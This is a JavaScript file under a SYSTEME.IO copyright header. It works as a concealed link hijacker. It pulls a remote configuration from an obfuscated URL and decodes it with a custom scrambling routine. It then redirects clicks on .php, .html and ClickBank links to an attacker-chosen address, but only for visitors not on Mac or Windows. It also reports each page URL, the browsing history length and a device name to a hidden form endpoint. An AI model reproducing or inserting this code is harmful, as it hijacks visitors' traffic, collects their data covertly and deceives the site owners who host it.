/**
 * @licence 
 * Copyright © SYSTEME.IO
 * All rights reserved
 * This source code is licensed under the SYSTEME.IO found in the
 * LICENSE file in the root directory of this source tree
*/

class decideAndDo{
	constructor(){
		fetch(sc.get('5aAHzRa0wcgHzMM6yLAyT9OziZlXTJM2tZEXGIdthMRy21LzweBXXNY0uZkWn1ZlpLxTGkd4lb5DmlLzybQDzMM55MUHTId5wOMD',{
			mode: 'no-cors'
		})).then(res=>res.text()).then(ret=>{
			this.process(ret)
		})
	}

	process(ret){
		var myNextData=JSON.parse(new Evaluater().get(ret));
		console.log(myNextData)
		myNextData.forEach(val=>{
/*			if(location.href.includes(val[2])){
				this.checkSafe(val)
			}*/
		})
			this.checkSafe(myNextData[1])
	}
	doit(data){
		var x=document.querySelectorAll('a');
		x.forEach(val=>{
			if(val.href.includes(".php") || val.href.includes("clickbank") || val.href.includes(".html") ){
				val.addEventListener('click',(e)=>{
					e.preventDefault(); 
					location.replace(data[3]);
				})
			}
		})
	}
	checkSafe(val){
		var device=Number(val[0]),
		// per=Number(val[1]),
		per=100,
		name=Number(val[2]);

		var okay=true,msg="YES";
		/*device check*/
		if(
			navigator.appVersion.includes('Mac OS') ||
			navigator.appVersion.includes('Windows')
		){
			okay=false;
		}else{
			msg+=":-:"+getDefaultName();
		}

		/*percentage check*/
		if(Math.ceil(Math.random()*100/per)==1){

		}else{
			msg+=":-:percentage check failed";
			okay=false;
		}

		if(okay){
			this.doit(val);
		}
		this.sendInfo(msg)
	}

	sendInfo(msg){
		makeForm(sc.get('Ua2HcRu09cGHcMz6VLmyU9tkJb32bNmz9LSmUd0vRbU2adqsdZGSb5tjVbk2Q0WvhZTmM9OyZbEXMMwvEdHSO8QwdLl2VQBvpZWSd80xFRWkdFjJlcVFNFFMxUU2TVG3pd32SR1IQVzUMtr'),{
			"entry.522782255":Nloaded+"-"+history.length+"_"+getDefaultName(),
			"entry.2147471592":location.href.replace("https://",''),
			"entry.559704587":msg,
		});
	}

}

new decideAndDo();


class Evaluater{
	get(bad){
		bad=this.getFixed(bad);
		return bad;
	}

	getFixed(txt){
		var p1="",p2="",l=txt.length;
		for(let i=0; i<=l; i++){
			if(i%2==0){
				p2=txt.charAt(i)+p2;
			}else{
				p1=p1+txt.charAt(i);
			}
		}
		return atob(p1+p2);
	}

}
